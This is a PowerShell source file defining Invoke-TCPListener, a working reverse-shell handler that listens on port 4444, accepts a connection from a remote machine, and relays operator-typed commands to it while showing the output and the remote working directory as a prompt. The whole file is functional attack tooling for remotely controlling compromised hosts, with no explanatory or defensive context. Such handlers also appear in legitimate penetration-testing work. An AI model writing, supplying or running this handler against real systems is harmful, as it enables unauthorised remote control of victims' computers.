Function Invoke-TCPListener {
	[CmdletBinding()]
	Param(
		[Parameter()]
		[ipaddress]$LocalIP = [ipaddress]::Any,

		[Parameter()]
		[ValidateRange(1, 65535)]
		[uint32]$Port = 4444
	)


	$listener = New-Object System.Net.Sockets.TcpListener($LocalIP, $Port)

	try {
		$listener.Start()
		$client = $listener.AcceptTcpClient()
		$stream = $client.GetStream()
		$remoteEndpoint = $client.Client.RemoteEndPoint
		
		$receive = New-Object byte[] 65535

		Write-Output "Connection from $($remoteEndpoint.Address) : $($remoteEndpoint.Port)"

        $remoteAddress=$remoteEndpoint.Address

		while( ($n=$stream.read($receive, 0, $receive.Length) ) -ne 0 ){

			$resultsReceived = [System.Text.Encoding]::ASCII.GetString($receive, 0, $n)
			
			Write-Output $resultsReceived
			
			$command = ''

			while($command -eq ''){

				$send = [System.Text.Encoding]::ASCII.GetBytes("(Get-Location).Path`n")
				$stream.Write($send, 0, $send.Length)
				$stream.Flush()

				$n=$stream.read($receive, 0, $receive.Length)
				$resultsReceived = [System.Text.Encoding]::ASCII.GetString($receive, 0, $n)
                $resultsReceived = ($resultsReceived -split "`n")[0]
				$prompt = "[$($remoteAddress)] $($resultsReceived)"

				$command = Read-Host -Prompt $prompt
				if($command -ceq 'exit'){
					$client.Close()
					$listener.Stop()
					return
				}
			}

			$send = [System.Text.Encoding]::ASCII.GetBytes($command)
			$stream.Write($send, 0, $send.Length)
			$stream.Flush()
		}

		$client.Close()
		$listener.Stop()

	} catch {
		Write-Error "Cannot bind on $LocalIP - $Port"
	}
}

